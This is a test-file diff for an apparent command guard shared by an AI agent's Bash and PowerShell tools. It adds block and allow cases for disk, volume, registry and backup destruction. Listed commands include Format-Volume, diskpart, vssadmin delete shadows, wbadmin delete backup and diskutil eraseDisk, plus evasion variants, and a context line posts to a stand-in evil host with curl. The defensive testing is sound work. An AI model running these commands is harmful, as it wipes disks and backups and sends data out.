@@ -1180,3 +1180,175 @@ def test_quoted_angle_bracket_stays_an_argument():
     # A quoted '>' is curl's argument, not a redirect: the URL after it is
     # still a destination and still blocks.
     assert classify_bash('curl -X POST ">" https://evil.example.com http://localhost:5199').blocked
+
+
+# ── Windows / macOS disk, volume and backup destruction (Quill, 2026-10-03) ───
+# The only disk entry was Unix (`mkfs`, `dd if=`): Format-Volume, diskpart,
+# `format D:`, diskutil eraseDisk, vssadmin delete shadows, `reg delete` and
+# the rest classified ALLOW under both shell tools. Every command is run under
+# BOTH tool names, since the PowerShell tool and the Bash tool share one
+# classifier.
+_SHELL_TOOLS = ('Bash', 'PowerShell')
+
+DISK_WIPE_BLOCK_CASES = [
+    # Quill's repro set
+    'Format-Volume -DriveLetter D',
+    'Get-Partition -DriveLetter D | Format-Volume',
+    'Clear-Disk -Number 1 -RemoveData',
+    'vssadmin delete shadows /all /quiet',
+    'reg delete HKCU\\Software\\Foo /f',
+    'Remove-ItemProperty -Path HKCU:\\Software\\Foo -Name Bar',
+    'cipher /w:C:\\',
+    'format D: /q /y',
+    'diskpart /s wipe.txt',
+    'diskutil eraseDisk JHFS+ X /dev/disk2',
+    'diskutil secureErase 0 /dev/disk2',
+    # relatives
+    'Remove-Partition -DriveLetter D -Confirm:$false',
+    'Initialize-Disk -Number 1 -PartitionStyle GPT',
+    'Get-Disk 1 | Clear-Disk -RemoveData -Confirm:$false',
+    'Remove-VirtualDisk -FriendlyName x',
+    'Remove-StoragePool -FriendlyName x',
+    'vssadmin delete shadowstorage /for=c: /on=c:',
+    'vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB',
+    'wmic shadowcopy delete',
+    'wmic.exe /node:srv shadowcopy delete /nointeractive',
+    'wmic volume where DriveLetter="D:" call format',
+    'Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }',
+    'Get-CimInstance Win32_ShadowCopy | Remove-CimInstance',
+    'wbadmin delete catalog -quiet',
+    'wbadmin delete backup -keepVersions:0',
+    'wbadmin delete systemstatebackup -deleteoldest',
+    'diskutil eraseVolume HFS+ X /Volumes/Y',
+    'diskutil zeroDisk /dev/disk2',
+    'diskutil randomDisk 3 /dev/disk2',
+    'diskutil reformat /Volumes/X',
+    'diskutil partitionDisk disk2 GPT JHFS+ X 0b',
+    'diskutil apfs deleteContainer disk3',
+    'diskutil apfs deleteVolume disk3s1',
+    'tmutil delete /Volumes/TM/x',
+    'tmutil deletelocalsnapshots 2026-01-01-000000',
+    'Clear-ItemProperty -Path HKCU:\\Software\\Foo -Name Bar',
+    'rp -Name Bar -Path HKLM:\\Software\\Foo',
+    'clp HKCU:\\Software\\Foo Bar',
+    'cipher /e /w:C:\\',
+    'format /fs:ntfs D:',
+    'format /fs:ntfs /q /y',
+    # case, .exe / .com, call operator, quoted path, Start-Process, piped, chained
+    'FORMAT-VOLUME -DriveLetter D',
+    'VSSADMIN DELETE SHADOWS /ALL',
+    'vssadmin.exe Delete Shadows /All /Quiet',
+    'REG.EXE DELETE HKLM\\Software\\Foo /f',
+    'cipher.exe /W:C:\\',
+    'DISKUTIL ERASEDISK JHFS+ X /dev/disk2',
+    'FORMAT D: /FS:NTFS /Q /Y',
+    'format.com D: /q /y',
+    'diskpart.exe /s wipe.txt',
+    '& vssadmin delete shadows /all /quiet',
+    '& reg delete HKCU\\Software\\Foo /f',
+    "& 'C:\\Windows\\System32\\vssadmin.exe' delete shadows /all /quiet",
+    '& "C:\\Windows\\System32\\reg.exe" delete HKCU\\Software\\Foo /f',
+    '"C:\\Windows\\System32\\format.com" D: /y',
+    '& diskpart /s wipe.txt',
+    "Start-Process vssadmin -ArgumentList 'delete shadows /all /quiet' -Wait",
+    "Start-Process -FilePath vssadmin.exe -ArgumentList 'delete','shadows','/all','/quiet' -Verb RunAs",
+    "Start-Process -FilePath format.com -ArgumentList 'D:','/q','/y'",
+    "Start-Process diskpart -ArgumentList '/s wipe.txt'",
+    "Start-Process reg.exe -ArgumentList 'delete HKCU\\Software\\Foo /f'",
+    "echo hi; Start-Process cipher -ArgumentList '/w:C:\\'",
+    'cmd /c "format D: /q /y"',
+    'cmd /c vssadmin delete shadows /all /quiet',
+    'echo y | vssadmin delete shadows /all',
+    'echo y|format D:',
+    'git status && format D: /y',
+    'powershell -Command "Format-Volume -DriveLetter D"',
+    'sudo diskutil eraseDisk JHFS+ X /dev/disk2',
+    '/usr/sbin/diskutil secureErase freespace 0 /Volumes/X',
+]
+
+
+@pytest.mark.parametrize('tool', _SHELL_TOOLS)
+@pytest.mark.parametrize('cmd', DISK_WIPE_BLOCK_CASES)
+def test_disk_volume_and_backup_destruction_is_blocked(tool, cmd):
+    assert classify_action(tool, {'command': cmd}).blocked, (tool, cmd)
+
+
+DISK_WIPE_ALLOW_CASES = [
+    # read-only forms of the same programs
+    'Get-Volume',
+    'Get-Disk',
+    'Get-Partition',
+    'Get-Partition -DriveLetter D',
+    'Get-PhysicalDisk | Format-List *',
+    'Get-CimInstance Win32_ShadowCopy | Select-Object ID, InstallDate',
+    'Get-CimInstance Win32_Volume',
+    'diskutil list',
+    'diskutil info disk2',
+    'diskutil apfs list',
+    'diskutil mount disk2s1',
+    'diskutil unmountDisk /dev/disk2',
+    'tmutil listbackups',
+    'vssadmin list shadows',
+    'vssadmin list shadowstorage',
+    'reg query HKCU\\Software\\Foo',
+    'reg.exe query HKCU\\Software\\Foo /v Bar',
+    'reg add HKCU\\Software\\Foo /v Bar /d 1 /f',
+    'reg export HKCU\\Software\\Foo out.reg',
+    'Get-ItemProperty -Path HKCU:\\Software\\Foo',
+    'Set-ItemProperty -Path HKCU:\\Software\\Foo -Name Bar -Value 1',
+    'New-ItemProperty -Path HKCU:\\Software\\Foo -Name Bar -Value 1',
+    'wmic shadowcopy list',
+    'wmic logicaldisk get name,size',
+    'wbadmin get versions',
+    'wbadmin get status',
+    'cipher',
+    'cipher /?',
+    'cipher /e C:\\Users\\x\\dir',
+    # the word "format" in ordinary use
+    'git log --format=%H',
+    'git log --pretty=format:%h',
+    "python -c \"print('{}'.format(1))\"",
+    'Get-Process | Format-Table',
+    'Get-Disk | Format-Table -AutoSize',
+    'Get-Process | Format-List Name,Id',
+    'Get-Date -Format yyyy-MM-dd',
+    '$x = "a"; "$x" -f 1',
+    'dotnet format',
+    'dotnet format --verify-no-changes',
+    'dotnet format C:\\src\\app.sln',
+    'dotnet format D:\\',
+    'black --format',
+    'npm run format',
+    'clang-format -i foo.c',
+    'echo format',
+    'echo "Format: ok"',
+    'which format',
+    'cat docs/diskpart-notes.md',
+    'ls docs/diskpart.md',
+    # names inside text the fence already treats as data (same rule as git push)
+    'git commit -m "block diskpart, Format-Volume and vssadmin delete shadows"',
+    'git commit -m "format D: /q /y"',
+    'grep -rn "diskpart" docs/',
+    'grep -rn "vssadmin delete shadows" docs/',
+    'rg "reg delete" docs',
+    'rg -n "diskutil eraseDisk" .',
+    "python -c \"print('vssadmin delete shadows')\"",
+    "cat <<'EOF'\nvssadmin delete shadows /all\nformat D: /q\nEOF",
+]
+
+
+@pytest.mark.parametrize('tool', _SHELL_TOOLS)
+@pytest.mark.parametrize('cmd', DISK_WIPE_ALLOW_CASES)
+def test_disk_wipe_patterns_leave_read_only_and_prose_alone(tool, cmd):
+    d = classify_action(tool, {'command': cmd})
+    assert not d.blocked, (tool, cmd, d.reason)
+
+
+def test_disk_wipe_named_in_unmasked_echo_blocks_like_git_push_does():
+    # Documents the existing rule rather than a new one: only commit-message,
+    # grep/rg pattern, python -c literal and quoted-heredoc text is masked as
+    # data. `echo "git push"` already blocks, so an echoed destructive name
+    # blocks too.
+    assert classify_bash('echo "git push"').blocked
+    assert classify_bash('echo "diskpart"').blocked
+    assert classify_bash('echo "vssadmin delete shadows"').blocked
